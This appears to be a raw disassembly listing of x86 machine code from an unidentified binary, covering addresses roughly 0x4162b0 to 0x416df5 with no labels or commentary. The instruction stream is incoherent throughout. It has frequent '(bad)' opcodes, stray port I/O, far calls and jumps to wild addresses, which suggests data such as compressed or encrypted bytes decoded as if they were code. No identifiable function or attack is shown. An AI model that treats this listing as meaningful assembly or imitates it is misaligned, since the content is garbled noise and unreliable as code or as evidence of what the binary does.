  4162b0:	stos   BYTE PTR es:[edi],al
  4162b1:	and    cl,ah
  4162b3:	test   BYTE PTR [edi+ecx*2+0x355d533b],al
  4162ba:	jno    0x416311
  4162bc:	sbb    BYTE PTR [edi+0x60],dl
  4162bf:	test   al,0x62
  4162c1:	fadd   QWORD PTR [edx+0x27b843a0]
  4162c7:	cmc    
  4162c8:	retf   0x7d31
  4162cb:	js     0x41629e
  4162cd:	jae    0x4162b5
  4162cf:	jmp    0x416308
  4162d1:	push   ds
  4162d2:	xor    DWORD PTR [eax],esp
  4162d4:	sbb    al,0xad
  4162d6:	xchg   ebp,eax
  4162d7:	xchg   eax,ecx
  4162d9:	xor    ebx,DWORD PTR [ebp-0x5dd79bba]
  4162df:	dec    eax
  4162e0:	shl    DWORD PTR [ebp+ecx*1-0x4b],0x5e
  4162e5:	xor    ebx,DWORD PTR [edi]
  4162e7:	repnz out 0x0,al
	...
  4164be:	add    BYTE PTR [eax],al
  4164c0:	add    dh,ah
  4164c2:	rcl    BYTE PTR [ecx+esi*8-0x2818084c],cl
  4164c9:	aad    0x75
  4164cb:	(bad)  
  4164cc:	adc    DWORD PTR [esp+ebx*8-0xec7e43b],esi
  4164d3:	add    DWORD PTR [eax],eax
  4164d5:	and    eax,0xfd000007
  4164da:	sbb    eax,DWORD PTR [esi]
  4164dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164dd:	fwait
  4164de:	jns    0x416483
  4164e0:	jmp    0x41649f
  4164e2:	push   es
  4164e3:	pop    ebx
  4164e4:	sahf   
  4164e5:	jnp    0x4164f9
  4164e7:	adc    eax,esp
  4164e9:	mov    cl,0xca
  4164eb:	dec    edi
  4164ec:	mov    eax,ds:0x77fc47f5
  4164f1:	cmp    cl,BYTE PTR [eax]
  4164f3:	pop    ebx
  4164f4:	int3   
  4164f5:	test   BYTE PTR [ebp+0x57],ch
  4164f8:	adc    dh,cl
  4164fa:	or     edi,DWORD PTR [edi-0x2d]
  4164fd:	mov    BYTE PTR [edx-0x361e4efd],ah
  416503:	dec    ebp
  416504:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416505:	frstor [ecx+0x78c1dc3c]
  41650b:	jno    0x416579
  41650d:	in     al,dx
  41650e:	dec    esi
  41650f:	add    ebx,0xc3c6b3e8
  416515:	lods   eax,DWORD PTR ds:[esi]
  416516:	mov    ah,0xf0
  416518:	in     al,dx
  416519:	or     eax,0x5eff8759
  41651e:	popf   
  41651f:	lock sub esp,DWORD PTR [eax]
  416522:	and    al,0x52
  416524:	popf   
  416525:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416526:	adc    cl,ch
  416528:	push   cs
  416529:	cmp    al,0xd9
  41652b:	adc    DWORD PTR [esi+0x3d],0x88889a70
  416532:	int3   
  416533:	sti    
  416534:	and    cl,ah
  416536:	stos   BYTE PTR es:[edi],al
  416537:	fcomip st,st(2)
  416539:	sub    al,0x80
  41653b:	sbb    BYTE PTR [ebx+0x5aa32a01],dl
  416541:	sar    edi,cl
  416543:	sbb    DWORD PTR [ebx+0x45],eax
  416546:	retf   0x859a
  416549:	mov    eax,ds:0x90606eb8
  41654e:	jbe    0x41657c
  416550:	sti    
  416551:	ret    
  416552:	push   ss
  416553:	ror    cl,cl
  416555:	cli    
  416556:	out    0x94,eax
  416558:	dec    ebp
  416559:	neg    BYTE PTR [esi]
  41655b:	aas    
  41655c:	jp     0x4165a3
  41655e:	scas   al,BYTE PTR es:[edi]
  41655f:	std    
  416560:	pop    ecx
  416561:	mov    bh,al
  416563:	test   al,0xb8
  416565:	cmp    ch,0x69
  416568:	in     eax,dx
  416569:	add    BYTE PTR [edx],bh
  41656b:	leave  
  41656c:	pop    ecx
  41656d:	jmp    0xacf58b10
  416572:	xchg   dl,cl
  416574:	addr16 mov eax,0xce0716de
  41657a:	test   eax,0xe3cbb022
  41657f:	int3   
  416580:	call   0x9794a4b2
  416585:	mov    ch,0x27
  416587:	lods   al,BYTE PTR ds:[esi]
  416588:	ja     0x416586
  41658a:	popf   
  41658b:	xor    eax,0xeae897b1
  416590:	adc    eax,DWORD PTR [edx-0x6f]
  416593:	mov    ecx,esi
  416595:	sub    BYTE PTR [edx+0x74],ch
  416598:	cli    
  416599:	dec    edx
  41659a:	retf   
  41659b:	adc    al,0x1
  41659d:	dec    esp
  41659e:	pop    edx
  41659f:	xor    al,0x30
  4165a1:	push   ecx
  4165a2:	adc    ah,BYTE PTR [edx+0x1a]
  4165a5:	sbb    eax,0x345c5d3b
  4165aa:	push   cs
  4165ab:	pop    ebx
  4165ac:	imul   eax,esi,0x75
  4165af:	jg     0x416595
  4165b1:	out    dx,eax
  4165b2:	je     0x4165c5
  4165b4:	xor    bh,BYTE PTR [ebx]
  4165b6:	push   ebp
  4165b7:	push   0x20
  4165b9:	sar    BYTE PTR [ebx+0x1b],cl
  4165bc:	lods   al,BYTE PTR ds:[esi]
  4165bd:	sub    ecx,DWORD PTR [ebx+0x49]
  4165c0:	add    BYTE PTR [esi+0x14],dh
  4165c3:	das    
  4165c4:	and    al,0xe4
  4165c6:	les    esi,FWORD PTR [edx]
  4165c8:	sub    bh,0x87
  4165cb:	cmp    eax,0xd297a45e
  4165d0:	sub    edi,DWORD PTR ds:0x43414e3f
  4165d6:	fidiv  WORD PTR ss:0xd7d84ffa
  4165dd:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4165df:	xor    bh,BYTE PTR [ecx+edi*4]
  4165e2:	xor    al,0xf3
  4165e4:	adc    BYTE PTR [edx-0x46d4a0d3],0xcb
  4165eb:	vcvtsi2sd xmm1,xmm3,DWORD PTR [esi-0x16]
  4165f0:	icebp  
  4165f1:	and    DWORD PTR [ebx+0x7d],ecx
  4165f4:	xchg   esi,eax
  4165f5:	inc    eax
  4165f6:	inc    ebp
  4165f7:	rol    BYTE PTR [esi-0x1f],0x9f
  4165fb:	push   esp
  4165fc:	icebp  
  4165fd:	scas   al,BYTE PTR es:[edi]
  4165fe:	xor    eax,0x30b59b63
  416603:	arpl   WORD PTR [ecx+0x6bb55dea],bx
  416609:	pop    esi
  41660a:	jbe    0x416651
  41660c:	shl    esi,0x17
  41660f:	out    dx,al
  416610:	lea    ecx,[si-0x52]
  416614:	(bad)  
  416615:	retf   
  416616:	add    eax,0x421cc143
  41661b:	aad    0x59
  41661d:	dec    edi
  41661e:	dec    esi
  41661f:	lods   al,BYTE PTR ds:[esi]
  416620:	fs adc dh,cl
  416623:	gs push ebx
  416625:	stos   BYTE PTR es:[edi],al
  416626:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416627:	jbe    0x41664e
  416629:	fild   WORD PTR [ebp+0x78]
  41662c:	push   cs
  41662d:	jb     0x41664f
  41662f:	call   0xfae9:0xf9d1fe18
  416636:	cli    
  416637:	out    dx,eax
  416638:	mov    esi,0x94b54836
  41663d:	stos   BYTE PTR es:[edi],al
  41663e:	jmp    DWORD PTR [edx+0x6a783386]
  416644:	xchg   ebp,eax
  416645:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416646:	in     eax,0x67
  416648:	je     0x41665a
  41664a:	stc    
  41664b:	gs mov esp,0x154dfd29
  416651:	ins    DWORD PTR es:[edi],dx
  416652:	xor    DWORD PTR [eax+0x4f4359dd],ecx
  416658:	fucomp st(3)
  41665a:	rcr    DWORD PTR [eax+0x642f1078],0xdf
  416661:	inc    edx
  416662:	sbb    DWORD PTR [ebp+0x30a4fea8],ecx
  416668:	frndint 
  41666a:	cmp    DWORD PTR [esi],edi
  41666c:	jl     0x4166b3
  41666e:	inc    ebx
  41666f:	mov    ebp,0x10e56394
  416674:	jae    0x416627
  416676:	fild   WORD PTR [ebx+0x692cfe55]
  41667c:	mov    ah,0x3a
  41667e:	push   ss
  41667f:	add    al,0x7e
  416681:	ficom  DWORD PTR [esp+ecx*8+0x3d]
  416685:	call   0xe3d6:0x3256aacc
  41668c:	push   edx
  41668d:	idiv   bl
  41668f:	sbb    al,0x42
  416691:	mov    bh,BYTE PTR [eax+0x7f6b86e4]
  416697:	cdq    
  416698:	jecxz  0x41665b
  41669a:	scas   al,BYTE PTR es:[edi]
  41669b:	fist   DWORD PTR [ebx-0x5d7bf533]
  4166a1:	mov    ebx,0x8d7b38e6
  4166a6:	call   0x6584b944
  4166ab:	nop
  4166ac:	mov    ch,0xdb
  4166ae:	push   ds
  4166af:	xor    BYTE PTR [esp+edx*4+0x2f],0x96
  4166b4:	loopne 0x4166ad
  4166b6:	or     bh,cl
  4166b8:	and    al,0xa
  4166ba:	pop    edi
  4166bb:	fsub   DWORD PTR [bx+di]
  4166be:	xor    al,0x93
  4166c0:	jmp    0x4034098c
  4166c5:	and    BYTE PTR [ecx],al
  4166c7:	add    DWORD PTR [esi+0x7a],edx
  4166ca:	out    0x76,al
  4166cc:	std    
  4166cd:	icebp  
  4166ce:	(bad)  
  4166cf:	push   0x7b
  4166d1:	sahf   
  4166d2:	add    esp,DWORD PTR [eax]
  4166d4:	and    eax,0xeeef07d8
  4166d9:	adc    dh,BYTE PTR [ecx-0x4e]
  4166dc:	sbb    al,BYTE PTR [ebx]
  4166de:	cwde   
  4166df:	cmp    ah,BYTE PTR [edx]
  4166e1:	ficom  DWORD PTR [ecx]
  4166e3:	jb     0x4166c6
  4166e5:	dec    edi
  4166e6:	and    al,0x9b
  4166e8:	ss int3 
  4166ea:	aam    0x19
  4166ec:	repnz fldcw WORD PTR [esi+0x11]
  4166f0:	jo     0x41671e
  4166f2:	add    eax,0x49f54055
  4166f7:	repz xchg esp,eax
  4166f9:	pop    edi
  4166fa:	jae    0x416736
  4166fc:	mov    esi,0xbfbaa55b
  416701:	jae    0x4166ed
  416703:	int    0x39
  416705:	dec    esp
  416706:	mov    ecx,edx
  416708:	imul   esp,DWORD PTR [eax+0x2edd1c36],0x1d
  41670f:	out    dx,eax
  416710:	mov    dh,0x10
  416712:	clc    
  416713:	sbb    dl,BYTE PTR [ecx+0x7430e55d]
  416719:	sbb    al,0x62
  41671b:	(bad)  
  41671c:	pusha  
  41671d:	dec    ebp
  41671e:	jbe    0x416732
  416720:	repnz mov edi,0xef0ffb8
  416726:	or     esp,DWORD PTR [eax+edx*4]
  416729:	pop    ebx
  41672a:	pop    edx
  41672b:	sub    al,0x2b
  41672d:	stos   BYTE PTR es:[edi],al
  41672e:	adc    edi,DWORD PTR [ebp-0x2c]
  416731:	imul   ebx,ebp,0x4e
  416734:	imul   ebp,DWORD PTR [edx],0x2
  416737:	mov    al,ch
  416739:	mov    cl,0xcf
  41673b:	lds    eax,FWORD PTR [eax]
  41673d:	pop    edx
  41673e:	aaa    
  41673f:	sbb    dh,BYTE PTR [edi-0x441bceab]
  416745:	xchg   BYTE PTR [ebx-0x18],al
  416748:	rcl    BYTE PTR [ebp+0x712db254],cl
  41674e:	mov    es,WORD PTR [ecx+0x59]
  416751:	in     al,dx
  416752:	xchg   ebp,eax
  416753:	stos   BYTE PTR es:[edi],al
  416754:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416755:	xor    dl,BYTE PTR [ebp+0x6585b6f9]
  41675b:	outs   dx,DWORD PTR ds:[esi]
  41675c:	sub    BYTE PTR [eax+eiz*1],cl
  41675f:	enter  0xbc7b,0xf4
  416763:	stc    
  416764:	mov    dh,0x2f
  416766:	push   edx
  416767:	sbb    al,BYTE PTR es:[ebx+0x41]
  41676b:	fild   DWORD PTR [eax]
  41676d:	push   0x30
  41676f:	pop    ss
  416770:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416771:	lods   al,BYTE PTR ds:[esi]
  416772:	in     eax,dx
  416773:	cld    
  416774:	cdq    
  416775:	inc    esi
  416776:	dec    ebx
  416777:	sbb    DWORD PTR [esi-0x53],edx
  41677a:	out    dx,al
  41677b:	stc    
  41677c:	sub    al,0xc5
  41677e:	in     eax,dx
  41677f:	shl    BYTE PTR ds:0xdb7f1904,0x4c
  416786:	cdq    
  416787:	clc    
  416788:	repnz cwde 
  41678a:	jo     0x41674d
  41678c:	cmp    edi,DWORD PTR [ebx-0x49f28cc9]
  416792:	call   0x138f:0x2b67bcea
  416799:	jmp    0x12a9:0xde7eeb05
  4167a0:	add    ch,ah
  4167a2:	icebp  
  4167a3:	ror    DWORD PTR [edx-0x79f383b1],cl
  4167a9:	into   
  4167aa:	cli    
  4167ab:	jmp    FWORD PTR ds:0xdbb9494a
  4167b1:	cwde   
  4167b2:	mov    eax,0x7c3a1c3a
  4167b7:	sbb    dh,BYTE PTR [ebp-0x27]
  4167ba:	push   0xffffffaf
  4167bc:	or     cl,bl
  4167be:	mov    bl,0xd
  4167c0:	pop    esi
  4167c1:	imul   DWORD PTR [ecx]
  4167c3:	gs aaa 
  4167c5:	mov    ebx,0x526e1389
  4167ca:	pop    esi
  4167cb:	mov    dl,0x35
  4167cd:	imul   edi,DWORD PTR [edx],0xc5bbd7f3
  4167d3:	jl     0x4167be
  4167d5:	or     cl,BYTE PTR [ebx-0x7eb99d01]
  4167db:	fs pop eax
  4167dd:	lods   al,BYTE PTR ds:[esi]
  4167de:	xchg   DWORD PTR [ebp+0x24],esi
  4167e1:	leave  
  4167e2:	(bad)  [ebx+0x3e23c54b]
  4167e8:	jne    0x4167b9
  4167ea:	and    DWORD PTR [ecx+ecx*2-0x7415fd7b],0xc2b4c91f
  4167f5:	push   eax
  4167f6:	scas   eax,DWORD PTR es:[edi]
  4167f7:	xor    bl,BYTE PTR [edx+0x103936dc]
  4167fd:	cmp    dh,BYTE PTR [eax+0x510f7a23]
  416803:	xlat   BYTE PTR ds:[ebx]
  416804:	jg     0x416872
  416806:	leave  
  416807:	stos   BYTE PTR es:[edi],al
  416808:	paddsb mm4,QWORD PTR [eax+esi*2-0x4c56efc6]
  416810:	jl     0x41681a
  416812:	mov    ah,0xab
  416814:	mov    bl,0x1c
  416816:	fild   QWORD PTR [ecx]
  416818:	jnp    0x416869
  41681a:	leave  
  41681b:	mov    BYTE PTR [eax-0x6ed9263b],ch
  416821:	rol    bh,0xee
  416824:	outs   dx,DWORD PTR ds:[esi]
  416825:	sub    BYTE PTR [ecx-0x5f],dh
  416828:	(bad)  
  416829:	and    BYTE PTR [ebx],dh
  41682b:	call   0x5eeb:0xff2e9e5c
  416832:	xor    ecx,DWORD PTR [edi]
  416834:	nop
  416835:	mov    ebx,0x78d4ff9e
  41683a:	xchg   ecx,eax
  41683b:	mov    al,0xfa
  41683d:	lahf   
  41683e:	push   eax
  41683f:	stc    
  416840:	call   0xaa75a009
  416845:	cli    
  416846:	cmp    eax,0xc315bf0c
  41684b:	cmp    esi,0xfffffffe
  41684e:	adc    ah,dl
  416850:	jb     0x41682b
  416852:	sti    
  416853:	sbb    bh,BYTE PTR gs:[edx+eiz*2+0x14f5854d]
  41685b:	cmp    al,0xa9
  41685d:	mov    DWORD PTR [esp+edi*2-0x7be2a661],ebp
  416864:	cmp    DWORD PTR [ebp+0x31],esi
  416867:	pop    DWORD PTR [eax+ecx*1+0x6e48fd0c]
  41686e:	adc    BYTE PTR [ebp-0x25],dl
  416871:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416872:	mov    bh,BYTE PTR [ebp+0x4]
  416875:	inc    esi
  416876:	(bad)  
  416877:	out    0x1d,al
  416879:	lods   eax,DWORD PTR ds:[esi]
  41687a:	ds push edx
  41687c:	cmp    al,0x8e
  41687e:	push   esp
  41687f:	ins    DWORD PTR es:[edi],dx
  416880:	jns    0x41686b
  416882:	vpsadbw xmm5,xmm4,xmm0
  416887:	or     BYTE PTR [edi],dl
  416889:	or     esp,DWORD PTR [esi+edi*2-0xa]
  41688d:	cmp    ecx,esi
  41688f:	xchg   esp,eax
  416890:	ds daa 
  416892:	test   eax,0xc0d4436
  416897:	hlt    
  416898:	adc    DWORD PTR [esi],ebx
  41689a:	and    eax,0xf9dea5f2
  41689f:	xchg   esp,eax
  4168a0:	stc    
  4168a1:	test   cl,ch
  4168a3:	mov    fs,WORD PTR [ecx+0x5e]
  4168a6:	xchg   edx,eax
  4168a7:	loop   0x416855
  4168a9:	shr    DWORD PTR [ebx+ebx*2+0x6b],cl
  4168ad:	mov    ecx,DWORD PTR [ecx]
  4168af:	mov    dh,0xc5
  4168b1:	pop    ebx
  4168b2:	int3   
  4168b3:	mov    ds:0x2e236a98,al
  4168b8:	lahf   
  4168b9:	les    edx,FWORD PTR [edi-0xb155320]
  4168bf:	in     eax,dx
  4168c0:	jno    0x416890
  4168c2:	xchg   edi,eax
  4168c3:	test   eax,0xe2aa8dae
  4168c8:	or     DWORD PTR [edx-0x1f],edi
  4168cb:	bound  ebp,QWORD PTR [eax+0x37]
  4168ce:	ins    DWORD PTR es:[edi],dx
  4168cf:	mov    BYTE PTR [ebx+edi*1],al
  4168d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168d4:	xchg   ebx,eax
  4168d5:	hlt    
  4168d6:	ret    0x8834
  4168d9:	rol    ch,0x60
  4168dc:	imul   ecx,ecx,0x3d
  4168df:	test   BYTE PTR [edi-0x3b],dl
  4168e2:	and    eax,0x944d78d5
  4168e7:	cs test al,0xc9
  4168ea:	retf   0xd7a5
  4168ed:	fst    DWORD PTR [ebx]
  4168ef:	pop    ebp
  4168f0:	dec    edi
  4168f1:	sbb    esi,ebx
  4168f3:	pop    edi
  4168f4:	test   DWORD PTR [ebx-0x5d],esp
  4168f7:	mov    esi,0xd356b105
  4168fc:	jle    0x416945
  4168fe:	add    BYTE PTR [ecx],ch
  416900:	fidivr WORD PTR [ebx]
  416902:	xlat   BYTE PTR ds:[ebx]
  416903:	dec    edi
  416904:	and    bl,ah
  416906:	and    bh,BYTE PTR [edx]
  416908:	rcr    DWORD PTR [edx+0x40],cl
  41690b:	ret    
  41690c:	xor    ah,ah
  41690e:	jmp    0x416932
  416910:	jl     0x416965
  416912:	retf   0x2d7d
  416915:	fild   DWORD PTR [edx]
  416917:	dec    ebp
  416918:	or     ebp,DWORD PTR [eax+0x61]
  41691b:	enter  0x7de3,0x49
  41691f:	dec    edi
  416920:	mul    esi
  416922:	sti    
  416923:	jb     0x4168b5
  416925:	mov    eax,ds:0xf361e884
  41692a:	adc    DWORD PTR [esi-0x5422d422],0xca351cb
  416934:	jo     0x41696c
  416936:	les    edi,FWORD PTR [edx]
  416938:	push   ds
  416939:	mov    edx,0x8ddc3595
  41693e:	dec    edi
  41693f:	jbe    0x416956
  416941:	test   eax,0x764d739b
  416946:	xchg   BYTE PTR [edx],bh
  416948:	shl    DWORD PTR [esp+eiz*8],cl
  41694b:	in     eax,0x81
  41694d:	push   0xc5e9724f
  416952:	out    0xe1,eax
  416954:	loopne 0x416984
  416956:	imul   eax,DWORD PTR [ebx],0x2c9bf2b3
  41695c:	test   al,0xe0
  41695e:	aad    0x37
  416960:	shl    eax,1
  416962:	iret   
  416963:	jo     0x4169d2
  416965:	dec    ebp
  416966:	xchg   edx,eax
  416967:	cmp    eax,0x46eceeca
  41696c:	xchg   ecx,eax
  41696d:	push   esi
  41696e:	sbb    bl,0x19
  416971:	out    0xc4,eax
  416973:	pop    ss
  416974:	ror    DWORD PTR [esi+0x5e],cl
  416977:	mov    al,ds:0x4a9d81fb
  41697c:	loop   0x4169f4
  41697e:	mov    esp,0x13797a6
  416983:	shr    DWORD PTR [edx],1
  416985:	sbb    BYTE PTR [ecx+0x5f],0x91
  416989:	sti    
  41698a:	les    ebx,FWORD PTR [ecx-0x51]
  41698d:	push   edx
  41698e:	mov    ah,0xbc
  416990:	jmp    0x1ac1d53f
  416995:	rep lods eax,DWORD PTR ds:[esi]
  416997:	test   eax,0xd461eea5
  41699c:	rsqrtps xmm0,xmm3
  41699f:	stc    
  4169a0:	jae    0x416980
  4169a2:	jmp    0x41693b
  4169a4:	in     eax,dx
  4169a5:	mov    bl,0x2c
  4169a7:	cmp    al,0x6d
  4169a9:	inc    DWORD PTR [ebp-0x1ba653cd]
  4169af:	mov    ch,0x48
  4169b1:	pop    ds
  4169b2:	ret    0xccd7
  4169b5:	pop    ecx
  4169b6:	inc    esi
  4169b7:	xchg   ebp,eax
  4169b8:	sub    eax,DWORD PTR [ebx+0x7540158]
  4169be:	mov    DWORD PTR [eax],esp
  4169c0:	sbb    DWORD PTR [esi],0x71a5bea5
  4169c6:	jns    0x416a2f
  4169c8:	xor    BYTE PTR [esi+edi*1],bl
  4169cb:	add    DWORD PTR [ecx-0x57],edi
  4169ce:	nop
  4169cf:	and    eax,0x2edd64fb
  4169d4:	lods   al,BYTE PTR ds:[esi]
  4169d5:	xor    eax,edx
  4169d7:	and    BYTE PTR [eax+0x63f87c09],bl
  4169dd:	scas   eax,DWORD PTR es:[edi]
  4169de:	and    cl,dl
  4169e0:	and    ecx,DWORD PTR [ecx-0x5911fe8e]
  4169e6:	ins    DWORD PTR es:[edi],dx
  4169e7:	cmc    
  4169e8:	out    0xe1,al
  4169ea:	push   edx
  4169eb:	sti    
  4169ec:	icebp  
  4169ed:	dec    esi
  4169ee:	push   ss
  4169ef:	and    al,0x1a
  4169f1:	and    al,0x98
  4169f3:	fdivr  st(3),st
  4169f5:	sbb    eax,0xc202b39d
  4169fa:	jnp    0x416a6b
  4169fc:	sbb    eax,DWORD PTR [edi-0x14]
  4169ff:	gs mov esi,0xb3b1bb00
  416a05:	sub    al,0xef
  416a07:	inc    esi
  416a08:	push   edi
  416a09:	push   0x78
  416a0b:	fs pop ds
  416a0d:	add    ecx,DWORD PTR [ebp+0x52]
  416a10:	enter  0x4651,0xd1
  416a14:	into   
  416a15:	pop    ebx
  416a16:	div    BYTE PTR [edi+0x26]
  416a19:	std    
  416a1a:	inc    ecx
  416a1b:	jno    0x416a19
  416a1d:	scas   eax,DWORD PTR es:[edi]
  416a1e:	aas    
  416a1f:	add    eax,0xef990753
  416a24:	mov    DWORD PTR [ebp+0x59be791],eax
  416a2a:	jbe    0x416a61
  416a2c:	inc    esp
  416a2d:	ja     0x416a81
  416a2f:	stos   BYTE PTR es:[edi],al
  416a30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a31:	sub    DWORD PTR [edx+esi*4],ecx
  416a34:	jle    0x4169d1
  416a36:	push   0xffffffb5
  416a38:	sbb    BYTE PTR [edi],bl
  416a3a:	inc    eax
  416a3b:	mov    bh,0x85
  416a3d:	in     al,dx
  416a3e:	and    eax,0x36acf26f
  416a43:	(bad)  
  416a44:	mov    esp,0x44f5b3a4
  416a49:	adc    al,0x74
  416a4b:	push   esp
  416a4c:	cmp    ebx,DWORD PTR [ebx+ebp*4-0x3961150a]
  416a53:	scas   eax,DWORD PTR es:[edi]
  416a54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a55:	or     ah,ch
  416a57:	iret   
  416a58:	lds    ecx,FWORD PTR [ebx]
  416a5a:	xchg   ecx,eax
  416a5b:	push   esi
  416a5c:	mov    esp,gs
  416a5e:	in     al,dx
  416a5f:	mov    esp,0x4edcc2c4
  416a64:	pop    ebp
  416a65:	mov    ds:0xd0256330,al
  416a6a:	xor    ah,cl
  416a6c:	add    DWORD PTR [ecx],0x91fc8d02
  416a72:	and    DWORD PTR [eax],0xd91882a0
  416a78:	mov    eax,0xe4e661e3
  416a7d:	add    eax,edx
  416a7f:	btc    DWORD PTR [edi-0x5ef2640b],edx
  416a86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a87:	(bad)
  416a8b:	(bad)  
  416a8d:	cwde   
  416a8e:	shl    DWORD PTR [esi],1
  416a90:	(bad)  
  416a91:	scas   eax,DWORD PTR es:[edi]
  416a92:	ret    0xfde4
  416a95:	jb     0x416a3e
  416a97:	pop    esp
  416a98:	popf   
  416a99:	inc    eax
  416a9a:	xor    DWORD PTR ds:0xac37a9ce,esi
  416aa0:	imul   ebp,DWORD PTR [edi-0x32],0x15d26da
  416aa7:	imul   edi,DWORD PTR [eax+0x1b4189e6],0xefda38aa
  416ab1:	inc    ecx
  416ab2:	(bad)  
  416ab3:	test   eax,0xc051faaf
  416ab8:	cli    
  416ab9:	into   
  416aba:	lods   eax,DWORD PTR ds:[esi]
  416abb:	out    dx,al
  416abc:	(bad)  
  416abd:	into   
  416abe:	mov    ds:0x3c627c0,al
  416ac3:	mov    WORD PTR [eax],cs
  416ac5:	sub    al,0x7b
  416ac7:	inc    dx
  416ac9:	arpl   WORD PTR ds:0xf52ff836,cx
  416acf:	out    dx,eax
  416ad0:	or     al,0x63
  416ad2:	and    eax,0x9841c5f2
  416ad7:	rol    DWORD PTR [esi+eiz*2-0x56],cl
  416adb:	xchg   ebx,eax
  416adc:	int    0x94
  416ade:	xor    DWORD PTR [eax+0x20ddc75c],0xae7501a9
  416ae8:	fwait
  416ae9:	cdq    
  416aea:	or     DWORD PTR [edx],edx
  416aec:	aad    0xac
  416aee:	in     al,dx
  416aef:	jmp    0x416b50
  416af1:	add    BYTE PTR [esi],al
  416af3:	cmp    BYTE PTR [esi],ch
  416af5:	mov    dl,BYTE PTR [edi]
  416af7:	ds adc eax,0xa1a98954
  416afd:	mov    ds:0x53b0f116,al
  416b02:	shr    ebx,1
  416b04:	mov    eax,ds:0x5efd45c9
  416b09:	xor    dh,al
  416b0b:	sahf   
  416b0c:	and    al,ah
  416b0e:	ds lahf 
  416b10:	add    al,0x43
  416b12:	inc    ebx
  416b13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b14:	leave  
  416b15:	ret    
  416b16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b17:	gs ins BYTE PTR es:[edi],dx
  416b19:	retf   0x929
  416b1c:	dec    edi
  416b1d:	and    DWORD PTR [ebp-0x69],edi
  416b20:	jbe    0x416b6f
  416b22:	fcom   QWORD PTR [edi-0x53]
  416b25:	and    eax,0xe8328719
  416b2a:	inc    ebx
  416b2b:	sbb    al,0xce
  416b2d:	sahf   
  416b2e:	xor    eax,0x7b9239ca
  416b33:	ss add al,0x12
  416b36:	add    eax,DWORD PTR [edi-0x57aa7f27]
  416b3c:	rol    DWORD PTR [ecx+0x69223b3a],cl
  416b42:	sbb    eax,0x9e59b805
  416b47:	push   0xf2aff367
  416b4c:	add    al,0x12
  416b4e:	das    
  416b4f:	mov    cl,0x39
  416b51:	stos   DWORD PTR es:[edi],eax
  416b52:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  416b54:	loopne 0x416bcd
  416b56:	mov    edi,0x4f1a28f4
  416b5b:	cld    
  416b5c:	adc    DWORD PTR [eax+0x3b],edx
  416b5f:	rol    BYTE PTR [ebx-0x61fdb956],0x1e
  416b66:	mov    ah,0x34
  416b68:	inc    edi
  416b69:	je     0x416b1c
  416b6b:	test   DWORD PTR [esi+0x52b94721],ebp
  416b71:	(bad)  
  416b73:	sti    
  416b74:	ror    BYTE PTR [edi+0x336a2d59],cl
  416b7a:	mov    ecx,0x7b462b60
  416b7f:	jbe    0x416b15
  416b81:	arpl   WORD PTR [edi+ecx*4-0x3e],sp
  416b85:	push   edx
  416b86:	mov    cl,BYTE PTR [ebx]
  416b88:	bound  edx,QWORD PTR [ebx+eax*4+0x3b]
  416b8c:	cmp    edx,0x8
  416b8f:	mov    edx,0xa53f47a
  416b94:	in     al,dx
  416b95:	jge    0x416b23
  416b97:	dec    ebp
  416b98:	div    ebx
  416b9a:	fnstenv [ebx+eiz*8+0x37]
  416b9e:	inc    esp
  416b9f:	pop    ebp
  416ba0:	dec    esi
  416ba1:	cmp    bh,bl
  416ba3:	xor    al,0xb8
  416ba5:	loopne 0x416b5f
  416ba7:	scas   eax,DWORD PTR es:[edi]
  416ba8:	mov    al,0xc3
  416baa:	sbb    BYTE PTR [ebp+0x5],al
  416bad:	mov    esp,0x549f03bd
  416bb2:	mov    ecx,0xd0fb7ad1
  416bb7:	xchg   edi,eax
  416bb8:	pop    ecx
  416bb9:	mov    ebp,0x8c05d43f
  416bbe:	adc    DWORD PTR [ecx+0x2537451d],esi
  416bc4:	pop    ebp
  416bc5:	cmp    ebx,esi
  416bc7:	inc    edi
  416bc8:	fdivr  DWORD PTR [edx+ebp*4-0x1e]
  416bcc:	inc    edi
  416bcd:	mov    edi,0x95e3c5b8
  416bd2:	xchg   ecx,eax
  416bd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bd4:	addr16 ret 0xbc0e
  416bd8:	xor    BYTE PTR [ebp-0xedd9442],cl
  416bde:	scas   al,BYTE PTR es:[edi]
  416bdf:	outs   dx,DWORD PTR ds:[esi]
  416be0:	mov    ecx,0x24558371
  416be5:	ins    DWORD PTR es:[edi],dx
  416be6:	ins    DWORD PTR es:[edi],dx
  416be7:	daa    
  416be8:	xor    ebp,DWORD PTR [edx+ebx*1-0x977ae00]
  416bef:	mov    bh,0xaa
  416bf1:	dec    ecx
  416bf2:	out    dx,eax
  416bf3:	ret    0xd484
  416bf6:	adc    eax,0x1ad561
  416bfb:	test   eax,0xbf9d
	...
  416dcc:	add    BYTE PTR [eax],al
  416dce:	xor    eax,esp
  416dd0:	loope  0x416d8b
  416dd2:	icebp  
  416dd3:	mov    ecx,0xab3fe879
  416dd8:	in     al,0x3
  416dda:	jnp    0x416d75
  416ddc:	xchg   ebx,eax
  416ddd:	sahf   
  416dde:	adc    ebp,edx
  416de0:	add    DWORD PTR [eax],eax
  416de2:	and    eax,0xfa000007
  416de7:	sub    BYTE PTR [eax+0x75],0x7b
  416deb:	pop    esp
  416dec:	rol    DWORD PTR [esi],0x8d
  416def:	repz scas eax,DWORD PTR es:[edi]
  416df1:	xor    BYTE PTR [esi],ch
  416df3:	push   esp
  416df4:	cwde   
  416df5:	xchg   ebx,esp
